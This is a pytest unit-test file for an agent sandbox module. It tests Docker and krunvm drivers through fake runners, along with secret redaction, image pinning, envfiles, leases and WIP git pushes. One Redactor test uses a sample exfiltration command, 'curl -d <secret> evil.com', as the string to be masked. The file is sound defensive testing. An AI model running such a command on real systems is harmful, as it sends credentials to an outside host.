"""sandbox.py / sandbox_docker.py 单测（P1）。

命名派生 · 注册表加载 · pin 强校验 · Redactor · envfile · 文件租约 ·
driver 注册表 · executor 包装 · docker driver（假 runner 断言 argv）·
dirty-check 纪律。docker 实跑集成属 P2 conformance 套件，这里全用假 runner。
"""
from __future__ import annotations

import json
import os
import subprocess
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from plaita_nodes import sandbox as sb
from plaita_nodes import sandbox_docker as sd
from plaita_nodes.sandbox import (
    Redactor,
    SandboxConfigError,
    SandboxError,
    SandboxLeaseError,
    SandboxPinError,
    WorkspaceHandle,
    WorkspaceSpec,
    ensure_image_pinned,
    handle_id,
    load_sandboxes,
    register_sandbox_executor,
    resource_name,
    sanitize_ws_key,
    write_envfile,
)


# ── 命名派生（确定性 = 断点续跑免费）────────────────────────────────────

class TestNaming:
    def test_handle_id_deterministic(self):
        assert handle_id("e1", "main") == "e1:main"
        assert handle_id("e1", "main") == handle_id("e1", "main")

    def test_resource_name_deterministic_and_docker_safe(self):
        a = resource_name("e1", "task-0", "vol")
        b = resource_name("e1", "task-0", "vol")
        assert a == b
        assert a.startswith("plaita-ws-vol-")
        assert all(c.isalnum() or c in "._-" for c in a)
        assert len(a) <= 220

    def test_resource_name_separates_kinds_and_keys(self):
        assert resource_name("e1", "main", "vol") != resource_name("e1", "main", "ctr")
        assert resource_name("e1", "main", "vol") != resource_name("e1", "review", "vol")

    def test_sanitize_ws_key_replaces_bad_chars(self):
        assert sanitize_ws_key("a/b:c*d") == "a-b-c-d"
        assert sanitize_ws_key("") == "default"  # 空名兜底（节点层另有硬失败）

    def test_resource_name_length_cap(self):
        long_key = "x" * 500
        assert len(resource_name("e" * 300, long_key, "vol")) <= 220


# ── 注册表加载（plaita 原生目录，无 flowcast 遗留）─────────────────────

def _write_sandboxes(home: Path, body: dict, repo: Path | None = None):
    (home / ".plaita").mkdir(parents=True, exist_ok=True)
    target = (repo / ".plaita") if repo else (home / ".plaita")
    target.mkdir(parents=True, exist_ok=True)
    (target / "sandboxes.json").write_text(json.dumps(body), encoding="utf-8")


class TestLoadSandboxes:
    def test_load_and_interpolation(self, tmp_path, monkeypatch):
        monkeypatch.setattr(sb.Path, "home", lambda: tmp_path)
        _write_sandboxes(tmp_path, {"sandboxes": {"main": {
            "driver": "docker", "image": "reg/img@sha256:abc",
            "provision": {"git": {"repo": "https://x/y.git"}},
            "env": {"GIT_TOKEN": "${TEST_TOKEN}"},
        }}})
        specs = load_sandboxes(environ={"TEST_TOKEN": "tok-xyz"})
        spec = specs["main"]
        assert spec.driver == "docker"
        assert spec.env["GIT_TOKEN"] == "tok-xyz"

    def test_missing_var_fails_fast(self, tmp_path, monkeypatch):
        monkeypatch.setattr(sb.Path, "home", lambda: tmp_path)
        _write_sandboxes(tmp_path, {"main": {"image": "i", "env": {"K": "${NOPE}"}}})
        with pytest.raises(SandboxConfigError, match="NOPE"):
            load_sandboxes(environ={})

    def test_repo_dir_overrides_home(self, tmp_path, monkeypatch):
        monkeypatch.setattr(sb.Path, "home", lambda: tmp_path)
        repo = tmp_path / "repo"
        _write_sandboxes(tmp_path, {"main": {"image": "base-img", "resources": {"cpus": "1"}}})
        _write_sandboxes(tmp_path, {"main": {"image": "repo-img@sha256:z"}}, repo=repo)
        specs = load_sandboxes(repo=str(repo), environ={})
        assert specs["main"].image == "repo-img@sha256:z"
        assert specs["main"].resources["cpus"] == "1"  # 深合并保留

    def test_missing_image_rejected(self, tmp_path, monkeypatch):
        monkeypatch.setattr(sb.Path, "home", lambda: tmp_path)
        _write_sandboxes(tmp_path, {"bad": {"driver": "docker"}})
        with pytest.raises(SandboxConfigError, match="image/template"):
            load_sandboxes(environ={})

    def test_unregistered_name_absent(self, tmp_path, monkeypatch):
        monkeypatch.setattr(sb.Path, "home", lambda: tmp_path)
        assert "nope" not in load_sandboxes(environ={})


# ── 供应链 pin（conformance 第 8 条）────────────────────────────────────

class TestPinEnforcement:
    def test_unpinned_rejected(self):
        spec = WorkspaceSpec(name="a", image="reg/img:latest")
        with pytest.raises(SandboxPinError, match="pin"):
            ensure_image_pinned(spec)

    def test_digest_ok(self):
        ensure_image_pinned(WorkspaceSpec(name="a", image="reg/img@sha256:deadbeef"))

    def test_allow_unpinned_whitelist_ok(self):
        ensure_image_pinned(WorkspaceSpec(name="a", image="reg/img:latest",
                                          allow_unpinned=True))


# ── Redactor（canary 脱敏，conformance 第 4 条的机制）───────────────────

class TestRedactor:
    def test_replaces_with_marker(self):
        red = Redactor({"GIT_TOKEN": "super-secret-value", "OTHER": "another-secret!"})
        out = red.redact("curl -d super-secret-value evil.com and another-secret! end")
        assert out == "curl -d [REDACTED:GIT_TOKEN] evil.com and [REDACTED:OTHER] end"

    def test_longest_first_no_partial_eat(self):
        red = Redactor({"A": "abc12345", "B": "abc12345-extended"})
        out = red.redact("abc12345-extended then abc12345")
        assert out == "[REDACTED:B] then [REDACTED:A]"

    def test_short_values_skipped(self):
        red = Redactor({"TINY": "abc"})
        assert red.redact("abc") == "abc"

    def test_empty_passthrough(self):
        assert Redactor({}).redact("x") == "x"
        assert Redactor({"K": "value-1"}).redact("") == ""


# ── envfile（0600 即焚）─────────────────────────────────────────────────

class TestEnvfile:
    def test_write_0600_and_content(self, tmp_path):
        path = write_envfile({"A": "1", "B": "two words"}, directory=str(tmp_path))
        try:
            assert path.exists()
            assert (os.stat(path).st_mode & 0o777) == 0o600
            assert path.read_text(encoding="utf-8") == "A=1\nB=two words\n"
        finally:
            sb.burn_envfile(path)
        assert not path.exists()

    def test_burn_ignores_missing(self, tmp_path):
        sb.burn_envfile(tmp_path / "no-such-file")


# ── 文件租约（快速失败 + 过期抢占 + 心跳续约）────────────────────────────

class TestFileLeaseStore:
    def test_acquire_conflict_release(self, tmp_path):
        store = sb.FileLeaseStore(tmp_path)
        assert store.acquire("k", "h1", ttl=60) is True
        assert store.acquire("k", "h2", ttl=60) is False
        assert store.release("k", "h1") is True
        assert store.acquire("k", "h2", ttl=60) is True

    def test_expired_steal(self, tmp_path):
        store = sb.FileLeaseStore(tmp_path)
        assert store.acquire("k", "h1", ttl=0.05) is True
        time.sleep(0.08)
        assert store.acquire("k", "h2", ttl=60) is True  # 过期 → 抢占

    def test_renew_holder_match_and_expiry(self, tmp_path):
        store = sb.FileLeaseStore(tmp_path)
        store.acquire("k", "h1", ttl=60)
        assert store.renew("k", "h1", ttl=60) is True
        assert store.renew("k", "other", ttl=60) is False
        store.release("k", "h1")
        assert store.renew("k", "h1", ttl=60) is False


class TestWorkspaceLease:
    def test_conflict_raises_fast(self, tmp_path):
        store = sb.FileLeaseStore(tmp_path)
        store.acquire("k", "holder-a", ttl=60)
        lease = sb.WorkspaceLease(store, "k", ttl=60, holder="holder-b")
        with pytest.raises(SandboxLeaseError, match="租约被他人持有"):
            lease.acquire()

    def test_heartbeat_keeps_alive(self, tmp_path):
        store = sb.FileLeaseStore(tmp_path)
        lease = sb.WorkspaceLease(store, "k", ttl=0.25, holder="h")
        lease.acquire()
        lease.start_heartbeat()
        try:
            time.sleep(0.5)  # 远超原始 TTL，心跳应一直续
            assert store.renew("k", "h", ttl=60) is True  # 仍持有且未过期
            assert lease.lost is False
        finally:
            lease.release()

    def test_release_idempotent_context(self, tmp_path):
        store = sb.FileLeaseStore(tmp_path)
        with sb.WorkspaceLease(store, "k", ttl=60, holder="h") as lease:
            pass
        lease.release()  # 二次 release 不炸
        assert store.acquire("k", "other", ttl=60) is True


# ── driver 注册表 + executor 包装 ───────────────────────────────────────

class RecordingDriver:
    name = "recording"

    def __init__(self, git_results=None):
        self.calls: list = []
        self._git_results = list(git_results or [])

    def ensure(self, spec, execution_id, ws_key):
        self.calls.append(("ensure", spec.name, execution_id, ws_key))
        return WorkspaceHandle(driver=self.name, id=handle_id(execution_id, ws_key),
                               path=sb.SANDBOX_PATH, ws_key=ws_key,
                               execution_id=execution_id,
                               data={"container": f"c-{ws_key}",
                                     "volume": f"v-{ws_key}", "image": spec.image})

    def wrap_argv(self, handle, agent_argv, timeout_secs, envfile):
        self.calls.append(("wrap", handle.id, timeout_secs))
        return ["wrapped", *agent_argv]

    def enforce(self, handle, force=True):
        self.calls.append(("enforce", handle.id))

    def git(self, handle, args, envfile=None):
        self.calls.append(("git", *args))
        if self._git_results:
            return self._git_results.pop(0)
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    def release(self, handle, keep_data=True):
        self.calls.append(("release", handle.id, keep_data))


class TestDriverRegistry:
    def test_register_and_get(self):
        driver = RecordingDriver()
        sb.register_driver("rec-test", driver)
        try:
            assert sb.get_driver("rec-test") is driver
            assert sb.get_driver("docker") is not None  # sandbox_docker import 即注册
        finally:
            sb.SANDBOX_DRIVERS.pop("rec-test", None)

    def test_entrypoint_load_warns_not_raises(self, monkeypatch):
        broken = SimpleNamespace(name="broken", load=lambda: (_ for _ in ()).throw(RuntimeError("boom")))
        good = SimpleNamespace(name="good", load=lambda: RecordingDriver())
        monkeypatch.setattr("importlib.metadata.entry_points",
                            lambda group=None: [broken, good])
        warns = []
        loaded = sb.load_entrypoint_drivers(warn=warns.append)
        assert loaded == 1
        assert any("broken" in w for w in warns)
        sb.SANDBOX_DRIVERS.pop("good", None)


class TestRegisterSandboxExecutor:
    def test_wraps_only_when_flag_set(self):
        from agentproc import EXECUTORS

        def make():
            # 桩须与**真实 executor 契约**同形：agentproc 以位置参数传第 4 参
            # `_ctx`（`{"permission": ...}`，随 efc95e7 引入）。包装层会原样
            # 转发，故桩写成 3 参会让包装层的 4 参调用失败（2026-10-11 实测）。
            def build_args(message, session_id, env, _ctx=None):
                return ["echo", message]
            return {"build_args": build_args, "cli_name": "echo"}

        EXECUTORS["wrap-base"] = {"cli_name": "echo", "plain": True,
                                  "make_handlers": make}
        try:
            name = register_sandbox_executor("wrap-base")
            assert name == "wrap-base-sandbox"
            handlers = EXECUTORS[name]["make_handlers"]()
            base_env = {}
            assert handlers["build_args"]("hi", "", base_env) == ["echo", "hi"]  # 无旗标透传
            flag_env = {sb.SANDBOX_ENV_FLAG: "1", "PLAITA_SANDBOX_IMAGE": "img@sha256:a"}
            with pytest.raises(SandboxConfigError, match="旋钮缺失"):
                handlers["build_args"]("hi", "", flag_env)  # 旋钮不全 → 拒绝裸跑
        finally:
            EXECUTORS.pop("wrap-base", None)
            EXECUTORS.pop("wrap-base-sandbox", None)

    def test_missing_base_raises(self):
        with pytest.raises(SandboxConfigError, match="未注册"):
            register_sandbox_executor("no-such-executor")


# ── docker driver（假 runner；conformance 1/2/3/6/8 的单测形态）─────────

class TestDockerDriver:
    @staticmethod
    def _driver(recorder, outputs=None, data_root=None):
        seq = list(outputs or [])

        def run(argv, timeout):
            recorder.append(argv)
            if seq:
                return seq.pop(0)
            return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")

        return sd.DockerDriver(data_root=data_root, run_fn=run)

    def _spec(self, **kw):
        base = {"name": "main", "driver": "docker", "image": "reg/img@sha256:abc"}
        base.update(kw)
        return WorkspaceSpec(**base)

    def test_ensure_happy_path_and_idempotent_attach(self, tmp_path):
        # conformance 1/2：同 (execution_id, ws_key) 二次 ensure = attach（不再 clone）
        recorder: list = []
        driver = self._driver(recorder, data_root=str(tmp_path), outputs=[
            subprocess.CompletedProcess([], 1, stdout="", stderr="no such container"),   # rm -f 残留
            subprocess.CompletedProcess([], 1, stdout="", stderr="not a repo"),          # probe
            subprocess.CompletedProcess([], 0, stdout="", stderr=""),                    # clone
        ])
        spec = self._spec(provision={"git": {"repo": "https://x/y.git", "branch": "dev"}})
        handle = driver.ensure(spec, "e1", "main")
        assert handle.id == handle_id("e1", "main")
        assert handle.path == sb.SANDBOX_PATH
        assert handle.data["datadir"] == str(
            tmp_path / "plaita-ws-data-e1-main")
        assert (Path(handle.data["datadir"]) / ".plaita-sandbox.json").exists()  # sidecar
        assert handle.data["container"] == resource_name("e1", "main", "ctr")
        clone = next(argv for argv in recorder if "clone" in argv)
        assert "--branch" in clone and "dev" in clone

        recorder.clear()
        driver.ensure(spec, "e1", "main")
        assert not any("clone" in argv for argv in recorder)  # probe 命中 → attach

    def test_ensure_rejects_unpinned(self):
        driver = self._driver([])
        with pytest.raises(SandboxPinError):
            driver.ensure(self._spec(image="reg/img:latest"), "e1", "main")

    def test_ensure_clone_failure_raises(self):
        recorder: list = []
        driver = self._driver(recorder, outputs=[
            subprocess.CompletedProcess([], 1, stdout="", stderr=""),   # rm 残留
            subprocess.CompletedProcess([], 1, stdout="", stderr="not a repo"),  # probe
            subprocess.CompletedProcess([], 0, stdout="", stderr=""),   # 内容清空
            subprocess.CompletedProcess([], 128, stdout="", stderr="fatal: repository not found"),
        ])
        spec = self._spec(provision={"git": {"repo": "https://x/none.git"}})
        with pytest.raises(SandboxError, match="provision clone"):
            driver.ensure(spec, "e1", "main")

    def test_wrap_argv_shape(self):
        recorder: list = []
        driver = self._driver(recorder)
        handle = driver.ensure(self._spec(), "e1", "main")
        argv = driver.wrap_argv(handle, ["recursive", "run", "hi"], 1800, Path("/tmp/e.env"))
        assert argv[0] == driver.bin
        assert argv[argv.index("--name") + 1] == resource_name("e1", "main", "ctr")
        assert f"{handle.data['datadir']}:{sb.SANDBOX_PATH}" in argv
        assert argv[argv.index("--env-file") + 1] == "/tmp/e.env"
        assert argv[argv.index("--entrypoint") + 1] == "timeout"   # 镜像 ENTRYPOINT 不参与执行链
        assert argv[-1:] == ["hi"]
        assert argv[-2] == "run"
        assert argv[-3] == "recursive"
        assert argv[-4] == "1800"                                   # 墙钟紧跟镜像
        assert argv[-5] == "reg/img@sha256:abc"

    def test_wrap_argv_from_env_full_and_missing(self):
        env = {"PLAITA_SANDBOX_IMAGE": "img@sha256:a", "PLAITA_SANDBOX_NAME": "ctr",
               "PLAITA_SANDBOX_VOLUME": "vol", "PLAITA_SANDBOX_PATH": sb.SANDBOX_PATH,
               "PLAITA_SANDBOX_ENVFILE": "/tmp/e.env", "PLAITA_SANDBOX_TIMEOUT": "60",
               "PLAITA_SANDBOX_NETWORK": "none", "PLAITA_SANDBOX_CPUS": "2"}
        argv = sd.wrap_argv_from_env(env, ["agent", "run"])
        assert ["--network", "none"] == argv[argv.index("--network"):argv.index("--network") + 2]
        assert argv[argv.index("--cpus") + 1] == "2"
        with pytest.raises(SandboxConfigError, match="旋钮缺失"):
            sd.wrap_argv_from_env({"PLAITA_SANDBOX_IMAGE": "img"}, ["agent"])

    def test_enforce_kills_by_derived_name(self):
        recorder: list = []
        driver = self._driver(recorder)
        handle = driver.ensure(self._spec(), "e1", "main")
        recorder.clear()
        driver.enforce(handle)
        flat = [x for argv in recorder for x in argv]
        assert resource_name("e1", "main", "ctr") in flat  # conformance 3：按名击杀

    def test_git_redacts_output(self):
        red = Redactor({"GIT_TOKEN": "secret-value-1"})
        driver = sd.DockerDriver(run_fn=lambda argv, t: subprocess.CompletedProcess(
            argv, 0, stdout="remote: secret-value-1", stderr=""), redactor=red)
        handle = driver.ensure(self._spec(), "e1", "main")
        out = driver.git(handle, ["status"])
        assert "secret-value-1" not in (out.stdout or "")

    def test_release_keep_data_semantics(self, tmp_path):
        recorder: list = []
        driver = self._driver(recorder)
        driver._data_root = str(tmp_path)  # 真实目录供 rmtree 断言
        handle = driver.ensure(self._spec(), "e1", "main")
        datadir = Path(handle.data["datadir"])
        assert datadir.exists()
        recorder.clear()
        driver.release(handle, keep_data=True)
        assert datadir.exists()                                  # 数据层保留
        recorder.clear()
        driver.release(handle, keep_data=False)
        assert not datadir.exists()                              # rmtree 数据目录
        # 计算面清理：按名 rm 容器
        flat = [x for argv in recorder for x in argv]
        assert resource_name("e1", "main", "ctr") in flat


# ── krunvm driver（本地 microVM 实验档；假 run_fn 断言）─────────────────

class TestKrunvmDriver:
    @staticmethod
    def _driver(recorder, list_names=("krun-e2e",)):
        from plaita_nodes.sandbox_krunvm import KrunvmDriver

        def run(argv, timeout, cwd=None):
            recorder.append((argv, cwd))
            if argv[:2] == ["krunvm", "list"]:
                out = "\n".join(list_names)
                return subprocess.CompletedProcess(argv, 0, stdout=out, stderr="")
            return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")

        return KrunvmDriver(data_root="/tmp/krun-test-data", run_fn=run)

    def test_ensure_creates_vm_and_attaches(self):
        from plaita_nodes.sandbox_krunvm import KrunvmDriver

        recorder: list = []
        created: list = []

        def run(argv, timeout, cwd=None):
            recorder.append((argv, cwd))
            if argv[:2] == ["krunvm", "list"]:
                out = "\n".join(created)
                return subprocess.CompletedProcess(argv, 0, stdout=out, stderr="")
            if argv[:2] == ["krunvm", "create"]:
                created.append(argv[argv.index("--name") + 1])
            return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")

        driver = KrunvmDriver(data_root="/tmp/krun-test-data", run_fn=run)
        spec = WorkspaceSpec(name="main", driver="krunvm",
                             image="alpine:latest", allow_unpinned=True,
                             resources={"cpus": "2", "mem": "512"})
        handle = driver.ensure(spec, "e1", "Main-0")
        vm = resource_name("e1", "Main-0", "vm").lower()
        create = next(argv for argv, _ in recorder if "create" in argv)
        assert "--name" in create and vm in create
        assert "--cpus" in create and "2" in create
        assert any(a.startswith("/tmp/krun-test-data/") for a in create)
        assert handle.data["vm"] == vm and handle.path == sb.SANDBOX_PATH

        recorder.clear()
        driver.ensure(spec, "e1", "Main-0")
        assert not any("create" in argv for argv, _ in recorder)  # 幂等 attach

    def test_wrap_shape_and_dispatch(self):
        from plaita_nodes.sandbox_krunvm import wrap_argv_from_env
        env = {"PLAITA_SANDBOX_NAME": "plaita-ws-vm-e1-main",
               "PLAITA_SANDBOX_TIMEOUT": "1800"}
        argv = wrap_argv_from_env(env, ["recursive", "run", "hi"])
        assert argv[:4] == ["krunvm", "start", "plaita-ws-vm-e1-main", "--"]
        assert argv[4:6] == ["timeout", "1800"]
        assert argv[-1] == "hi"
        with pytest.raises(SandboxConfigError, match="旋钮缺失"):
            wrap_argv_from_env({}, ["agent"])

    def test_dispatch_routes_by_driver(self):
        kenv = {"PLAITA_SANDBOX_DRIVER": "krunvm", "PLAITA_SANDBOX_NAME": "vm",
                "PLAITA_SANDBOX_TIMEOUT": "30"}
        assert sb.wrap_agent_argv_from_env(kenv, ["x"])[0] == "krunvm"
        denv = {"PLAITA_SANDBOX_DRIVER": "docker", "PLAITA_SANDBOX_IMAGE": "i",
                "PLAITA_SANDBOX_NAME": "c", "PLAITA_SANDBOX_VOLUME": "v",
                "PLAITA_SANDBOX_PATH": "/work", "PLAITA_SANDBOX_ENVFILE": "/tmp/e",
                "PLAITA_SANDBOX_TIMEOUT": "30"}
        assert sb.wrap_agent_argv_from_env(denv, ["x"])[0] == "docker"
        with pytest.raises(SandboxConfigError, match="没有 env 包装实现"):
            sb.wrap_agent_argv_from_env({"PLAITA_SANDBOX_DRIVER": "nope"}, ["x"])

    def test_git_runs_host_side_with_cwd(self):
        recorder: list = []
        driver = self._driver(recorder)
        handle = driver.ensure(WorkspaceSpec(name="m", driver="krunvm",
                                             image="alpine:latest",
                                             allow_unpinned=True), "e1", "main")
        recorder.clear()
        driver.git(handle, ["status", "--porcelain"], envfile=Path("/tmp/e.env"))
        argv, cwd = recorder[0]
        assert argv[0] == "git"                       # 宿主 git，非 krunvm start
        assert cwd and cwd.startswith("/tmp/krun-test-data/")  # 数据面在宿主数据目录

    def test_release_deletes_vm_and_data(self, tmp_path):
        from plaita_nodes.sandbox_krunvm import KrunvmDriver

        recorder: list = []

        def run(argv, timeout, cwd=None):
            recorder.append((argv, cwd))
            out = "krun-x\n" if argv[:2] == ["krunvm", "list"] else ""
            return subprocess.CompletedProcess(argv, 0, stdout=out, stderr="")

        driver = KrunvmDriver(data_root=str(tmp_path), run_fn=run)
        handle = driver.ensure(WorkspaceSpec(name="m", driver="krunvm",
                                             image="alpine:latest",
                                             allow_unpinned=True), "e1", "main")
        datadir = Path(handle.data["datadir"])
        assert datadir.exists()
        recorder.clear()
        driver.release(handle, keep_data=False)
        assert ["krunvm", "delete", handle.data["vm"]] in [list(a) for a, _ in recorder]
        assert not datadir.exists()


# ── dirty-check 纪律（设计 §6.1：不靠 prompt 自觉）──────────────────────

class TestWipDiscipline:
    def _handle(self):
        return WorkspaceHandle(driver="recording", id=handle_id("e1", "main"),
                               path=sb.SANDBOX_PATH, ws_key="main", execution_id="e1",
                               data={"container": "c", "volume": "v", "image": "i@sha256:a"})

    def test_clean_no_push(self):
        driver = RecordingDriver()
        outcome = sb.wip_push_if_dirty(driver, self._handle(), self._spec_git())
        assert outcome == "clean"
        assert driver.calls == [("git", "status", "--porcelain")]

    def test_dirty_forces_wip_push(self):
        driver = RecordingDriver(git_results=[
            subprocess.CompletedProcess([], 0, stdout=" M file.py\n", stderr=""),
        ])
        outcome = sb.wip_push_if_dirty(driver, self._handle(), self._spec_git())
        assert outcome == "wip-pushed"
        git_calls = [c for c in driver.calls if c[0] == "git"]
        assert list(git_calls[1][1:]) == ["add", "-A"]
        commit_call = git_calls[2][1:]
        assert "commit" in commit_call and "user.name=plaita-sandbox" in commit_call
        assert f"plaita: wip snapshot {handle_id('e1', 'main')}" in commit_call
        push = list(git_calls[3][1:])
        assert push == ["push", "origin", "HEAD:plaita/wip/e1/main"]

    def test_status_failure_raises(self):
        driver = RecordingDriver(git_results=[
            subprocess.CompletedProcess([], 128, stdout="", stderr="fatal: not a repo"),
        ])
        with pytest.raises(SandboxError, match="dirty-check"):
            sb.wip_push_if_dirty(driver, self._handle(), self._spec_git())

    def test_no_git_provision_short_circuits(self):
        driver = RecordingDriver()
        assert sb.wip_push_if_dirty(driver, self._handle(),
                                    WorkspaceSpec(name="m", image="i@sha256:a")) == "no-git"
        assert driver.calls == []

    def test_suspend_release_releases_keep_data(self):
        driver = RecordingDriver()
        outcome = sb.suspend_release(driver, self._handle(), self._spec_git())
        assert outcome == "clean"
        assert driver.calls[-1] == ("release", handle_id("e1", "main"), True)

    @staticmethod
    def _spec_git():
        return WorkspaceSpec(name="main", image="i@sha256:a",
                             provision={"git": {"repo": "https://x/y.git"}})


# ── 快照收集（lifecycle 数据源：不依赖进程内存）─────────────────────────

class TestCollectSnapshots:
    def test_collects_from_node_states(self):
        context = {"$NODE": {
            "n1": {"workspace": {"ws_key": "main", "driver": "docker",
                                 "id": "e1:main", "path": "/work",
                                 "env_names": ["GIT_TOKEN"]}},
            "n2": {"text": "no sandbox here"},
            "n3": {"workspace": {"ws_key": "review", "driver": "e2b",
                                 "id": "e1:review", "path": "/work",
                                 "env_names": []}},
        }}
        snaps = sb.collect_workspace_snapshots(context)
        assert [s["id"] for s in snaps] == ["e1:main", "e1:review"]

    def test_empty_context(self):
        assert sb.collect_workspace_snapshots({}) == []
        assert sb.collect_workspace_snapshots({"$NODE": None}) == []


def test_sandbox_build_args_forwards_ctx():
    """沙箱包装层的 build_args 必须接收并**转发** agentproc 的第 4 参 `_ctx`。

    2026-10-11 生产实证：`register_sandbox_executor` 的包装层写成 3 参
    （`build_args(message, session_id, env)`），而 agentproc 恒以**位置参数**
    传第 4 参（`{"permission": ...}`，随 `efc95e7` 引入）⇒

        build_args() takes 3 positional arguments but 4 were given

    ⇒ **整个 `<base>-sandbox` executor 不可用**，是当期最大失败源
    （近 1h Mac 72 次 / VM 65 次）。同类缺陷在 `agent_run.py` 的 recursive
    直调路径已先修（f8bd3af），此处是沙箱包装层的等价处。

    本用例钉死「包装层收 4 参 + 原样转发给 base」，防再次漏改。
    """
    from agentproc import EXECUTORS

    seen = {}

    def make():
        def build_args(message, session_id, env, _ctx=None):
            seen["ctx"] = _ctx
            return ["echo", message]
        return {"build_args": build_args, "cli_name": "echo"}

    EXECUTORS["ctx-probe"] = {"cli_name": "echo", "plain": True,
                              "make_handlers": make}
    try:
        name = register_sandbox_executor("ctx-probe")
        h = EXECUTORS[name]["make_handlers"]()
        # 按 agentproc 的真实调用形态传 4 个位置参数
        argv = h["build_args"]("hi", "", {}, {"permission": "deny"})
        assert argv == ["echo", "hi"], argv
        assert seen.get("ctx") == {"permission": "deny"}, \
            f"包装层必须把 _ctx 原样转发给 base，实得 {seen.get('ctx')!r}"
    finally:
        EXECUTORS.pop("ctx-probe", None)
        EXECUTORS.pop("ctx-probe-sandbox", None)
